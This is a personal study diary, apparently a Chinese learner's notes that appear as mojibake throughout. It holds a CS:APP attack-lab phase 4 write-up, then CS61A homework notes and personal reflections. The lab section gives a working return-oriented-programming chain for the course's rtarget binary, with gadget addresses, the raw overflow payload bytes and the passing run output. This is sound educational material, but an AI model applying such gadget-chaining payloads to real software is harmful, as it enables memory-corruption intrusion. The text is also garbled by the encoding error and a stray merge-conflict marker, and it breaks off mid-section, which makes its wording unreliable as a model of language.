è¿”å›å¯¼å‘ç¼–ç¨‹è¿™ä¸€åç§°çš„ç”±æ¥æ˜¯å› ä¸ºå…¶æ ¸å¿ƒåœ¨äºåˆ©ç”¨äº†æŒ‡ä»¤é›†ä¸­çš„ ret æŒ‡ä»¤ï¼Œä»è€Œæ”¹å˜äº†æŒ‡ä»¤æµçš„æ‰§è¡Œé¡ºåºï¼Œå¹¶é€šè¿‡æ•°æ¡ gadget â€œæ‰§è¡Œâ€ äº†ä¸€ä¸ªæ–°çš„ç¨‹åºã€‚

retæŒ‡ä»¤ç›¸å½“äº`pop ip`ï¼Œå³å°†æ ˆé¡¶ä¿å­˜çš„æ•°æ®ä½œä¸ºç¨‹åºè®¡æ•°å™¨æ‰§è¡Œçš„åœ°å€ã€‚

æ¢³ç†ä¸‹phase4çš„é—®é¢˜ï¼š

ç°åœ¨ç”±äºåŠ å…¥äº†ä¸€äº›é™åˆ¶æ¡ä»¶ï¼Œéœ€è¦ç”¨å·²æœ‰ä»£ç è€Œä¸èƒ½è‡ªå·±ç¼–å†™æ¼æ´ä»£ç æ¥æ”»å‡»ç¨‹åºã€‚ç°åœ¨æƒ³å®ç°çš„æ˜¯è·Ÿphase2ç›¸åŒçš„æƒ³æ³•ï¼š

1. å°†getbufè°ƒç”¨åçš„è¿”å›åœ°å€è®¾ç½®ä¸ºæ¼æ´ä»£ç åœ°å€
2. è°ƒç”¨æ¼æ´ä»£ç 
   1. å°†cookieå€¼ä½œä¸ºtouch2å…¥å‚
   2. è°ƒç”¨touch2

ä¹‹å‰çš„æ€è·¯æ˜¯å°†æ¼æ´ä»£ç æ”¾åˆ°getbufç”³è¯·çš„æ ˆé¡¶ä½ç½®ï¼Œç„¶åè°ƒç”¨getbufåè¿”å›çš„åœ°å€è®¾ç½®ä¸ºæ¼æ´ä»£ç çš„ä½ç½®ï¼Œè¿™æ ·å°±å¯è¿›è¡Œæ”»å‡»äº†ã€‚ä¹‹å‰çš„æ¼æ´ä»£ç æ±‡ç¼–è¯­è¨€å®ç°ä¸ºï¼š

```assembly
movq $0x59b997fa,%rdi
pushq $0x4017ec
ret
```

ä½†æ˜¯ç°åœ¨æ¼æ´ä»£ç éœ€è¦é€šè¿‡å·²æœ‰çš„ä»£ç æ¥æ‹¼å‡‘ï¼Œå¹¶ä¸”æ— æ³•åšåˆ°åœ¨å·²æœ‰ä»£ç ä¸­æ‰¾åˆ°ä¸€æ®µä»£ç åŒ…å«cookieå€¼`0x59b997fa`ï¼Œä¹Ÿä¸èƒ½æ‰¾åˆ°`pushq $0x4017ec`çš„ç°æœ‰ä»£ç ã€‚

ç°åœ¨çš„æ€è·¯æ˜¯ï¼š

1. è¦æƒ³`cookie`çš„å€¼èµ‹å€¼ç»™`%rdi`ï¼Œå¯ä»¥å…ˆå°†`cookie`æ”¾åœ¨æ ˆé¡¶ä¸­ï¼ˆè¶…é‡å†™å…¥å³å¯ï¼‰ï¼Œç„¶åè°ƒç”¨`popq %rdi`ï¼Œä½¿æ ˆé¡¶ä¸­çš„`cookie`èµ‹å€¼ç»™`%rdi`.
2. å¦‚æœæƒ³è¦è®¿é—®touch2çš„åœ°å€ï¼Œå¯ä»¥å°†touch2çš„åœ°å€æœ€åå†™å…¥æ ˆé¡¶ä¸­ï¼Œç„¶åretå³å¯ã€‚

æœ€ç»ˆæƒ³è¦å®ç°çš„æ•ˆæœå¦‚å›¾æ‰€ç¤ºï¼š

![image-20240514194618556](E:\code_life\1_project\cs61a\2024notes\image\image-20240514194618556.png)

ä½†æ˜¯å‘ç°`gadget01`çš„ä»£ç å®ç°å³`5f`åœ¨`<start_farm>`å’Œ`<end_farm>`ä¹‹é—´å¹¶æ²¡æœ‰ç›´æ¥å®ç°ï¼Œé‚£æˆ‘ä»¬å¯ä»¥é€€è€Œæ±‚å…¶æ¬¡ï¼Œçœ‹çœ‹èƒ½å¦å…ˆå°†cookieå­˜å‚¨åˆ°å…¶ä»–å¯„å­˜å™¨ä¸­ï¼Œç„¶åå†ä½¿ç”¨`mov å¯„å­˜å™¨, rdi`ã€‚

`popq %rax`å­—èŠ‚è¡¨ç¤ºä¸ºï¼š`0x58`ï¼ŒæŸ¥çœ‹åœ¨`<start_farm>`å’Œ`<end_farm>`ä¹‹é—´æ˜¯å¦æœ‰è¿™ä¸ªæŒ‡ä»¤ï¼š

```assembly
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3						ret 
```

å¯ä»¥å‘ç°æ­£å¥½åœ¨`0x4019ca`åé¢åç§»3ä¸ªå­—èŠ‚çš„ä½ç½®å³`0x4019cc`çš„ä½ç½®å­˜åœ¨è¿™ä¸ªæŒ‡ä»¤ï¼Œå¹¶ä¸”å› ä¸º`0x90`æ˜¯`nop`æŒ‡ä»¤ä¸åšä»»ä½•æ“ä½œï¼Œè€Œåé¢çš„`c3`æ°å¥½æ˜¯æˆ‘ä»¬éœ€è¦çš„`ret`æŒ‡ä»¤çš„å­—èŠ‚è¡¨ç¤ºï¼Œæ‰€ä»¥å¯ä»¥å°†`gadget01`çš„ä½ç½®è®¾ç½®ä¸º`0x4019cc`ï¼Œå®ç°çš„æŒ‡ä»¤ä¸ºï¼š

```assembly
#gadget01ï¼š
popq %rax
ret
```

é‚£ä¹ˆç›¸å¯¹åº”çš„`gadget02`çš„æŒ‡ä»¤åº”è¯¥ä¸º

```assembly
#gadget02
movq %rax,%rdi # 48 89 c7
ret			   # c3
```

ç„¶åå°±åœ¨`<start_farm>`å’Œ`<end_farm>`ä¹‹é—´å¯»æ‰¾`48 89 c7`çš„æŒ‡ä»¤æ˜¯å¦å­˜åœ¨å¹¶ä¸”åé¢æ˜¯å¦å­˜åœ¨`ret`æŒ‡ä»¤ï¼š

```assembly
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret    
```

è¿™æ ·åœ¨åœ°å€`0x4019a2`å¤„çš„æŒ‡ä»¤æ°å¥½æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šå°†`gadget02`çš„ä½ç½®è®¾ç½®ä¸º`0x4019a2`ï¼Œè¿™æ ·ä¿®æ”¹åçš„æ ˆç©ºé—´ç¤ºæ„å›¾ä¸ºï¼š

![image-20240514200812560](E:\code_life\1_project\cs61a\2024notes\image\image-20240514200812560.png)

æ‰€ä»¥è®¾è®¡çš„è¾“å…¥æ•°æ®çš„æ€è·¯ä¸ºï¼š4017ec

- å‰äº”è¡Œï¼šå‰40ä¸ªå­—èŠ‚æ— æ•ˆè¾“å…¥å‡ä¸º0
- ç¬¬å…­è¡Œï¼šç´¢å¼•40åˆ°47å¤„ä¿å­˜gadget01ä»£ç åœ°å€
- ç¬¬ä¸ƒè¡Œï¼šç´¢å¼•48åˆ°55å¤„ä¿å­˜cookie
- ç¬¬å…«è¡Œï¼šç´¢å¼•56åˆ°63ä¿å­˜gadget02ä»£ç åœ°å€
- ç¬¬ä¹è¡Œï¼šç´¢å¼•64åˆ°71ä¿å­˜touch2çš„åœ°å€

å³ï¼š

```tex
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

æ‰§è¡Œåçš„æˆåŠŸç»“æœï¼š

```bash
crx@ubuntu:03_attack_lab$ ./rtarget -q -i exploit4-raw.txt
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

## 5.15

[Homework 6: OOP, Linked Lists](https://cs61a.org/hw/hw06/)

Vending Machineï¼š

éœ€æ±‚æ˜¯åˆ›å»ºä¸€ä¸ªè‡ªåŠ¨å”®å–æœºï¼Œè¿™ä¸ªç±»æƒ³å®ç°çš„æ˜¯ï¼š

1. å±æ€§ï¼šåˆ›å»ºå‡ºæŒ‡å®šå‡ºå”®è´§å“å’Œå•ä»·çš„ï¼Œæ•°é‡ä¸ºç©ºè‡ªåŠ¨å”®å–æœº
2. æ–¹æ³•ï¼š
   1. å­˜è´§ï¼šå¢åŠ å”®å–æœºçš„è´§å“
   2. åŠ é’±ï¼šè‹¥è´§ä¸ºç©ºï¼šåå‡ºåˆšç»™çš„é’±
   3. å”®å–ï¼š
      1. åˆšç»™å¤Ÿé’±ï¼Œç„¶åæ ¹æ®å•ä»·åå‡ºç›¸åº”æ•°é‡çš„è´§
      2. æ²¡ç»™å¤Ÿï¼Œæ ¹æ®æœ€ä½å•ä»·å’Œåˆšç»™çš„é’±ï¼Œç®—å·®ä»·
      3. ç»™å¤šäº†ï¼Œç»™ç›¸åº”çš„è´§å¹¶ä¸”æ‰¾é›¶

æŒ‰ç…§è¿™æ ·çš„æ€è·¯ï¼Œè®¾è®¡ä¸‹ä»£ç çš„å¤§ä½“å®ç°ï¼š

- ç±»å±æ€§ï¼šè´§ç‰©åç§°``product``ï¼Œå•ä»·``price``ï¼Œå­˜è´§é‡`inventory`å’Œå½“å‰æŠ•å¸é‡‘é¢`balance`ã€‚å¹¶ä¸”åˆå§‹åŒ–çš„æ—¶å€™ï¼Œè®©å­˜è´§é‡å’ŒæŠ•å¸é‡‘é¢ä¸º0

- æ–¹æ³•ï¼š

  - å­˜è´§`restock(nums)`ï¼šå­˜è´§é‡`inventory` += `nums`ã€‚å¹¶ä¸”è¾“å‡ºå½“å‰å­˜è´§é‡ï¼š

    ```py
    'Current' + product + 'stock: ' + str(inventory)
    ```

  - æŠ•é’±`add_funds(money)`ï¼š

    - è‹¥æ­¤æ—¶å­˜è´§é‡`inventory` = 0ï¼Œåˆ™è¾“å‡ºæ— å­˜è´§ï¼š

      ```py
      'Nothing left to vend. Please restock. Here is your $' + str(money) + '.'
      ```

    - æ­¤æ—¶å­˜è´§é‡`inventory` != 0ï¼ŒæŠ•å¸é‡‘é¢`balance` += `money`ï¼Œå¹¶ä¸”è¾“å‡ºï¼š

      ```py
      'Current balance: $' + str(balance)
      ```

  - å–è´§`vend()`ï¼š

    - è‹¥æ­¤æ—¶å­˜è´§é‡`inventory` = 0ï¼Œåˆ™è¾“å‡º

      ```py
      'Nothing left to vend. Please restock.'
      ```

    - å¦‚æœ`balance < price`ï¼Œè®¡ç®—èƒ½æ‹¿åˆ°ä¸€ä¸ªè´§ç‰©çš„è¯ï¼Œè¿˜éœ€è¦å¤šå°‘é’±`diff = price - balance`ï¼šè¾“å‡ºæƒ³è¦è´­ä¹°ä¸€ä¸ªè´§ç‰©è¿˜éœ€è¦å¤šå°‘é’±ï¼š

      ```py
      'Please add $'+ str(diff) + ' more funds.'
      ```

    - å¦‚æœ`balance == price`ï¼Œå°†æŠ•å¸é‡ç½®ä¸º0ï¼Œå­˜è´§é‡-1ï¼Œè¾“å‡º

      ```py
      'Here is your ' + product + '.'
      ```
      
    - å¦‚æœ`balance > price`ï¼Œæ‰¾é›¶`check = balance - 1*price`ï¼Œå°†æŠ•å¸é‡ç½®ä¸º0ï¼Œå­˜è´§é‡-1ï¼Œç„¶åå–è´§`inventory -= 1`å¹¶ä¸”è¾“å‡º

      ```py
      'Here is your ' + product + ' and $' + str(check) +' change.'
      ```
<<<<<<< HEAD

å®ç°äº†hw06ï¼Œä¸‹åˆæƒ³äº†è§£ä¸‹æœªæ¥çš„è·¯è¯¥æ€ä¹ˆèµ°ã€‚åˆ·åˆ°äº†[å®¿ç›çš„ç»éªŒåˆ†äº«ï¼šéè®¡ç®—æœºä¸“ä¸šçš„äººå¦‚ä½•è½¬è¡Œç¨‹åºå‘˜ï¼ˆå®¿ç›ï¼‰](https://www.bilibili.com/video/BV1R44y1H77u/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&vd_source=842936ebeedd7cce8bb2e1922b41edf1)ã€‚è§†é¢‘åˆ†äº«äº†è¿™ä¸ªå“¥ä»¬gapäº†ä¸€å¹´å­¦ä¹ è®¡ç®—æœºåŸºç¡€ï¼Œç„¶åæ‰¾åˆ°å·¥ä½œçš„æ•…äº‹ã€‚ç„¶åä¸‹é¢çš„è¯„è®ºåŒºæˆªå–äº†ä¸€äº›è€äººå¯»å‘³çš„è¯„è®ºï¼š

> Aï¼š1å¹´èƒ½æŠŠè¿™8ä¸ªè¯¾ç¨‹å­¦å®Œå—ï¼Ÿ
>
> Bï¼šçœ‹å¤©èµ‹ã€‚å¤§å¤šæ•°äººæ˜¯åšä¸åˆ°çš„ã€‚å†™labçš„æ—¶é—´æ˜¯ä¸å¯æ§çš„ã€‚debugçš„æ—¶é—´å¦ç®—ï¼Œé‡åˆ°å®Œå…¨æ²¡æ€è·¯çš„ï¼Œå†¥æ€è‹¦æƒ³ï¼Œä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™æƒ³å¾—å‡ºæ¥ï¼›ä¸Šç½‘æ‰¾ç­”æ¡ˆï¼Œåˆ™æ²¡æœ‰é‚£ç§ç‹¬è‡ªæ€è€ƒè§£å†³é—®é¢˜çš„æˆå°±æ„Ÿã€‚å¹¶ä¸”ï¼Œä¸æ˜¯è‡ªå·±å†¥æ€è‹¦æƒ³è§£å†³çš„ï¼Œå¾—åˆ°çš„æ”¶è·éƒ½ä¸ä¼šå¤ªæ·±åˆ»ã€‚å¦‚æœä»…ä»…æ˜¯çœ‹è§†é¢‘çœ‹ä¹¦è¿‡ä¸€éï¼Œä¸ç”¨è¯´ä¸€å¹´ï¼ŒåŠå¹´å°±èƒ½çœ‹å®Œå¾ˆå¤šè¯¾ç¨‹äº†ï¼Œä½†æ˜¯æ²¡æœ‰ç»è¿‡å¤§é‡çš„æ€è€ƒæŠŠlabå†™å‡ºæ¥ï¼ŒçœŸçš„æ•¢è¯´è‡ªå·±å·²ç»æ‡‚äº†ï¼Ÿåœ¨å­¦ä¹ è¿™ä»¶äº‹ä¸Šè¿˜æ˜¯åšä¸ªè€å®äººæ¯”è¾ƒå¥½ï¼Œä¸è¦è‡ªæ¬ºæ¬ºäºº

å—¯ï¼Œå®¿ç›çš„ç»å†çš„ç¡®å¾ˆå¼ºï¼Œä½†æ˜¯å› ä¸ºå¾ˆå¤šäººæ²¡æ³•äº²èº«å®è·µè¿™ä¸ªç»å†ï¼Œæ‰€ä»¥äº§ç”Ÿä¸€äº›å¯¹äºå­¦ä¹ æ–¹æ³•çš„å›°æƒ‘æ˜¯å¾ˆæ­£å¸¸ä¸è¿‡çš„ã€‚ä½†æ˜¯ä¸ºå•¥æˆ‘å°±é€‰æ‹©è¿™æ¡è‰°è‹¦çš„é“è·¯äº†å‘¢ï¼Ÿå› ä¸ºâ€œäºŒè€…ä¸å¯å¾—å…¼ï¼Œèˆé±¼è€Œå–ç†ŠæŒè€…ä¹Ÿâ€ã€‚

ä¸€æ˜¯å‡ºäºå¯¹å½“å‰å·¥ä½œçš„ä¸æ»¡ï¼Œè¿™ä¸ªå·¥ä½œå®åœ¨æ˜¯å¤ªæ— èŠäº†ï¼›å¦ä¸€ä¸ªå°±æ˜¯ä¼šæƒ³ï¼Œæˆ‘çš„äººç”Ÿå°±åˆ°æ­¤ä¸ºæ­¢äº†å—ï¼Ÿæˆ‘æ€•å·¥ä½œç¨³å®šåï¼Œä»¿ä½›äººç”Ÿå°±åœæ»ä¸€èˆ¬ä¸€ç›´åœ¨å¾ªç¯å¾€å¤ç€åŒä¸€å¤©ï¼Œæˆ‘æƒ³æ´»365å¤©è€Œä¸æ˜¯ä¸€å¤©é‡å¤365éã€‚ğŸ˜‰

äºŒæ˜¯å¯¹äºè‡ªå·±èƒ½åŠ›çš„è‡ªä¿¡ï¼Œä¹Ÿè®©æˆ‘ä¹äºå°è¯•è¿™ä¸ªæŒ‘æˆ˜ã€‚ç»å†è¿‡åŠå¹´çš„è€ƒç ”ç”Ÿæ¶¯ï¼Œä»æ— äººèƒ½è¯´çš„ç—›è‹¦ä¸­èœ•å˜çš„æˆ‘ï¼Œæœ‰ä»€ä¹ˆæ˜¯åšä¸åˆ°ï¼Ÿå‡è„‚æˆåŠŸå¹¶ä¸”ä¸æ–­åœ¨è·‘æ­¥é“è·¯ä¸Šå‰è¿›çš„æˆ‘ï¼Œæœ‰ä»€ä¹ˆåšä¸åˆ°çš„ï¼Ÿæˆ‘çŸ¥é“è‡ªå·±çš„å¼±ç‚¹ï¼Œä¹ŸçŸ¥é“è‡ªå·±çš„æ‡’æƒ°å’Œæ¾å¼›ï¼Œä½†æ˜¯æˆ‘æœ‰ä¿¡å¿ƒè·Ÿå®ƒä»¬å¥½å¥½ç›¸å¤„ã€‚å› ä¸ºæˆ‘çŸ¥é“ï¼Œå½“è´Ÿé¢æƒ…ç»ªæ¥çš„æ—¶å€™ï¼Œæ˜¯é‚£ä¸ªçœŸå®çš„è‡ªå·±åœ¨å‘æˆ‘æ±‚åŠ©ï¼æˆ‘æ„¿æ„å¥½å¥½çˆ±è‡ªå·±ï¼Œä¹Ÿæ„¿æ„åŒ…å®¹è‡ªå·±çš„è¿™äº›ç¼ºæ†¾ã€‚æ‰€ä»¥å³ä½¿ä¸€å¹´çš„gapæœ‰æ—¶å€™ä¼šå› ä¸ºæ²¡äººåˆä½œè€Œæ„Ÿåˆ°ä¸€ä¸ä¸æ— èŠï¼Œä½†æ˜¯å¯¹äºæ„¿æ„äº†è§£è‡ªå·±çš„æˆ‘æ¥è¯´ï¼Œèƒ½å¤Ÿè®©æˆ‘æ›´å¥½åœ°äº†è§£è‡ªå·±å¹¶ä¸”èƒ½è®©æˆ‘æå‡å¤„ç†è´Ÿé¢æƒ…ç»ªçš„èƒ½åŠ›ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘å¸Œæœ›è‡ªå·±èƒ½åšçš„æ›´å¥½åœ°åœ°æ–¹ã€‚

ä¸‰æ˜¯æˆ‘çš„å®¶äººå¯¹æˆ‘çš„æ”¯æŒã€‚æ„Ÿè°¢ä¼Ÿå¤§çš„çˆ¶äº²æ¯äº²çš„å…¨åŠ›æ”¯æŒï¼Œè¿˜æœ‰æˆ‘å¯å¯çˆ±çˆ±å§‘å¨˜çš„ä¿¡ä»»å’Œé™ªä¼´ï¼Œä¹Ÿè°¢è°¢å…„å¼Ÿä»¬çš„æ— ç§å¸®åŠ©ã€‚æˆ‘ç›¸ä¿¡æœ‰ä½ ä»¬ï¼Œæˆ‘èƒ½æ›´å¥½åœ°èµ°åˆ°å½¼å²¸ã€‚

å—¯ï¼Œç°åœ¨æ˜¯5æœˆä¸­æ—¬ï¼Œæˆ‘ç°åœ¨ä¸¤é—¨è¯¾ç¨‹ï¼Œcs61aè¿˜å‰©ä¸‹5å‘¨çš„å­¦ä¹ è®¡åˆ’ï¼Œå³ä¸€ä¸ªæœˆå·¦å³çš„æ—¶é—´å°±å¯ä»¥å®Œæˆäº†ã€‚å½“æ—¶ç»™è‡ªå·±å®šçš„æ—¶é—´æ˜¯æˆªæ­¢åˆ°6æœˆ7å·æå®Œã€‚

csappåˆšåˆšå®Œç»“attack labï¼Œè¿˜å‰©ä¸‹6ä¸ªå‘¨çš„å­¦ä¹ è®¡åˆ’ï¼Œä¹Ÿå°±æ˜¯è¯´åˆ°7æœˆåˆå³å¯å®Œæˆcsappçš„å­¦ä¹ ï¼Œè¿™ä¹Ÿæ˜¯å½“æ—¶åˆ¶å®šçš„å­¦ä¹ è®¡åˆ’ddlã€‚

## 5.16

å…³ç³»è¿‡äºå•ä¸€çš„è„†å¼±çš„åæœå°±æ˜¯æ— è¶£ï¼Œå¯„æœŸå¾…å’Œå¸Œæœ›äºå¦ä¸€åŠè¿‡äºè‡ªç§å’Œæ®‹å¿ã€‚

## 5.17

è·Ÿæœ‹å‹ä»¬èŠå¤©ï¼Œå…³å¿ƒä»–ä»¬ï¼Œæ„Ÿå—åˆ°äººä¸äººä¹‹é—´çš„è”ç³»æ˜¯éå¸¸æ£’çš„ã€‚ä»Šå¤©ä¸Šåˆå°±æ˜¯é˜…è¯»æ¢—æ¦‚ï¼Œä¸‹åˆæŠŠè¡Œæå¯„è¿‡å»ã€‚

- see ourselves as designers of languages

è¡¨è¾¾å¼expressionè®¡ç®—å¹¶è¿”å›ä¸€ä¸ªå€¼ï¼Œè€Œè¯­å¥statementç¨‹åºæ‰§è¡Œçš„åŸºæœ¬å•ä½ï¼Œå¯èƒ½ä¼šåŒ…å«ä¸€ä¸ªè‡³å¤šä¸ªè¡¨è¾¾å¼ã€‚

**3.2å‡½æ•°å¼ç¼–ç¨‹**

- å‰ç¼€è¡¨è¾¾å¼ï¼šæ“ä½œç¬¦å’Œæ“ä½œæ•°éƒ½è¢«æ”¾åœ¨ä¸€å¯¹æ‹¬å·é‡Œ`(quotient 10 2)`
- producureï¼š`(define (<name> <formal parameters>) <body>)`
- ç¬¦å·æ•°æ®ï¼šåªæ˜¯å¼•ç”¨ç‹—è¿™ä¸ªè¯ï¼Œè€Œä¸åœ¨ä¹å…¶å±æ€§çš„ç‰¹æ€§ã€‚`(list 'a 'b)`-->`(a b)`

**3.3å¼‚å¸¸**


## 5.21

å˜å¾—æ›´å¥½ï¼

æœ¬å‘¨è®¡åˆ’ï¼š

cs61aï¼š

- ç¬¬ä¹å‘¨+ç¬¬åäºŒã€åä¸‰å‘¨çš„å­¦ä¹ è®¡åˆ’
- antsé¡¹ç›®ä¸€é˜¶æ®µ

csappï¼š

- å®Œæˆarchitecture lab

é˜…è¯»ï¼š

- ä½ å¥½æ—§æ—¶å…‰

**Q3: FreeCheckingåˆ†æ**

- åˆå§‹åŒ–æ–¹æ³•ï¼šåŒ…å«å·²ç”¨å…è´¹æå–çš„æ¬¡æ•°`free_times`=0
- `withdraw(money)`ï¼š
  - å¦‚æœ`free_times`å°äº`free_withdrawals`çš„æ€»æ¬¡æ•°
    - å¦‚æœ`amount<= balance`ï¼Œåˆ™é‡‘é¢å‡å»`amount`ï¼Œè¿”å›å‰©ä½™é‡‘é¢ï¼Œä¸”`free_times += 1`
    - å¦‚æœ`amount> balance`ï¼Œåˆ™é‡‘é¢ä¸å˜ï¼Œè¿”å›`Insufficient funds`ï¼Œä¸”`free_times += 1`
  - å¦‚æœ`free_times`å¤§äºç­‰äº`free_withdrawals`çš„æ€»æ¬¡æ•°ï¼Œè¿™æ—¶å€™éœ€è¦æå–è´¹ç”¨`withdraw_fee`ï¼Œæ‰€ä»¥æ¯æ¬¡æå–é‡‘é¢ä¸ºä¸¤è€…ä¹‹å’Œ`fee_included_amount`
    - å¦‚æœ`fee_included_amount <= balance`ï¼Œåˆ™é‡‘é¢å‡å»`fee_included_amount`
    - å¦‚æœ`fee_included_amount  > balance`ï¼Œåˆ™é‡‘é¢ä¸å˜ï¼Œè¿”å›`Insufficient funds`

## 5.22

- For `s.rest.first.rest` to exist at all, the second element of `s`, called `s.rest.first`, must itself be a linked list.

```py
def strange_loop():
    """Return a Link s for which s.rest.first.rest is s.

    >>> s = strange_loop()
    >>> s.rest.first.rest is s
    True
    """
    s = Link(1, Link(Link(2)))
    s.rest.first.rest = s
    return s
```

è·³è¯»ç¬¬ä¸‰ç« 1+2ï¼ˆé¢„è®¡æ—¶é—´1hï¼‰

**3.1**

- interpreters have an elegant common structure: two mutually recursive functions. The first evaluates **expressions** in environments; the second **applies functions to arguments**.

**3.2**

- introduce a high-level programming language that encourages a functional style

- Scheme is a dialect of [Lisp](http://en.wikipedia.org/wiki/Lisp_(programming_language)).Scheme exclusively uses prefix notation

- if:`(if <predicate> <consequent> <alternative>)`

- function:`(define (<name> <formal parameters>) <body>)`

- Anonymous functions `(lambda (<formal-parameters>) <body>)` using the `lambda` special form

- ```scheme
  (define (plus4 x) (+ x 4))
  (define plus4 (lambda (x) (+ x 4)))
  ```

- lambda expression can be used as the operator in a call expressionï¼š`((lambda (x y z) (+ x y (square z))) 1 2 3)`

- `(list 'a 'b)`ï¼šrefer to the symbols `a` and `b` rather than their values by preceding them with a single quotation mark 

## 5.23

**3.3**

- Raising exceptions
- Handling exceptions

æ„å»ºå‰ç¼€è¡¨è¾¾å¼è¡¨è¾¾å¼æ ‘çš„ä¸€èˆ¬æ­¥éª¤ï¼š

ä»å‰ç¼€è¡¨è¾¾å¼çš„å¼€å¤´å¼€å§‹ï¼Œè¯»å–æ¯ä¸ªç¬¦å·ï¼ˆè¿ç®—ç¬¦æˆ–æ“ä½œæ•°ï¼‰ã€‚
å¦‚æœç¬¦å·æ˜¯æ“ä½œæ•°ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªå¶å­èŠ‚ç‚¹ï¼Œå¹¶å°†è¯¥æ“ä½œæ•°ä½œä¸ºèŠ‚ç‚¹çš„å€¼ã€‚
å¦‚æœç¬¦å·æ˜¯è¿ç®—ç¬¦ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªå†…éƒ¨èŠ‚ç‚¹ï¼Œå¹¶å°†è¯¥è¿ç®—ç¬¦ä½œä¸ºèŠ‚ç‚¹çš„å€¼ã€‚ç„¶åï¼Œæ ¹æ®è¯¥è¿ç®—ç¬¦çš„æ“ä½œæ•°æ•°é‡ï¼Œé€’å½’åœ°æ„å»ºå·¦å­æ ‘å’Œå³å­æ ‘ã€‚

ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œå°†å‰ç¼€è¡¨è¾¾å¼ "+ * 3 4 5" è½¬æ¢ä¸ºè¡¨è¾¾å¼æ ‘ï¼š

1. ä»å‰ç¼€è¡¨è¾¾å¼çš„å¼€å¤´å¼€å§‹ï¼Œç¬¬ä¸€ä¸ªç¬¦å·æ˜¯ "+"ï¼Œå› æ­¤åˆ›å»ºæ ¹èŠ‚ç‚¹ï¼Œå€¼ä¸º "+"ã€‚
2. ä¸‹ä¸€ä¸ªç¬¦å·æ˜¯ "*"ï¼Œå®ƒæ˜¯ "+" çš„å·¦å­èŠ‚ç‚¹ã€‚åˆ›å»ºä¸€ä¸ªå†…éƒ¨èŠ‚ç‚¹ï¼Œå€¼ä¸º "*"ã€‚
3. "*" çš„å·¦å­èŠ‚ç‚¹æ˜¯æ•°å­— 3ï¼Œå³å­èŠ‚ç‚¹æ˜¯æ•°å­— 4ã€‚
4. "+" çš„å³å­èŠ‚ç‚¹æ˜¯æ•°å­— 5ã€‚

æœ€ç»ˆçš„è¡¨è¾¾å¼æ ‘å¦‚ä¸‹æ‰€ç¤ºï¼š

```tex
   +
  / \
 *   5
/ \
3  4
```

**3.4**

- *lexical analyzer* partitions the input string into ***tokens***, which are the minimal syntactic units of the language such as names and symbols. 
- *syntactic analyzer* constructs an expression tree from this sequence of tokens.

## 5.27

æœ¬å‘¨è®¡åˆ’ï¼š

1. è·‘æ­¥50km
2. cs61aï¼š12å‘¨å’Œ13å‘¨çš„ä»»åŠ¡+`scheme`é¡¹ç›®çš„part1+2
3. csappï¼šå®Œæˆ[Lab04-Architecture_Lab](https://github.com/kcxain/CSAPP-Lab/blob/master/Notes/Lab04-Architecture_Lab.md)
4. è¯»å®Œä¸€æœ¬ä¹¦

ä»Šå¤©å­¦ä¹ ï¼š[lab9](https://cs61a.org/lab/lab09/)

è®¡ç®—ä¸¤ä¸ªæ•°çš„æœ€å¤§å…¬çº¦æ•°ï¼ˆGCDï¼ŒGreatest Common Divisorï¼‰çš„æ–¹æ³•æœ‰å¤šç§ï¼Œæœ€å¸¸ç”¨çš„æ˜¯æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼ˆEuclidean Algorithmï¼‰ã€‚è¯¥ç®—æ³•åŸºäºä»¥ä¸‹åŸç†ï¼šä¸¤ä¸ªæ•°çš„æœ€å¤§å…¬çº¦æ•°ç­‰äºå…¶ä¸­è¾ƒå°çš„æ•°ä¸ä¸¤æ•°ä¹‹å·®çš„æœ€å¤§å…¬çº¦æ•°ã€‚è¿™ä¸ªè¿‡ç¨‹å¯ä»¥åå¤åº”ç”¨ï¼Œç›´åˆ°ä¸¤ä¸ªæ•°ä¹‹ä¸€ä¸ºé›¶ã€‚

æ¬§å‡ é‡Œå¾—ç®—æ³•å¯ä»¥ç”¨é€’å½’æ–¹å¼å®ç°ï¼š

```py
def gcd_recursive(a, b):
    if b == 0:
        return a
    else:
        return gcd_recursive(b, a % b)

# ç¤ºä¾‹
print(gcd_recursive(48, 18))  # è¾“å‡º 6
print(gcd_recursive(56, 98))  # è¾“å‡º 14
```

è§£é‡Šï¼š

- å¦‚æœ *b* ä¸ºé›¶ï¼Œè¿”å› *a*ã€‚
- å¦åˆ™ï¼Œé€’å½’è°ƒç”¨å‡½æ•°ï¼Œ*b* å’Œ ğ‘modâ€‰â€‰ğ‘ä½œä¸ºå‚æ•°ã€‚

è€Œè¿™é‡Œç”¨`scheme`è¯­è¨€å®ç°çš„è¯ï¼Œå› ä¸ºä¸ç†Ÿæ‚‰è¯­æ³•å’Œç®—æ³•ï¼Œç°åœ¨æ‹¿ç­”æ¡ˆæ¥åˆ†æä¸‹å®ç°æ€è·¯ï¼š

```scheme
(define (max a b) (if (> a b) a b))
(define (min a b) (if (> a b) b a))
(define (gcd a b)
  (cond ((zero? a) b)
        ((zero? b) a)
        ((= (modulo (max a b) (min a b)) 0) (min a b))
        (else (gcd (min a b) (modulo (max a b) (min a b)))))
)
```

è§£é‡Šï¼š

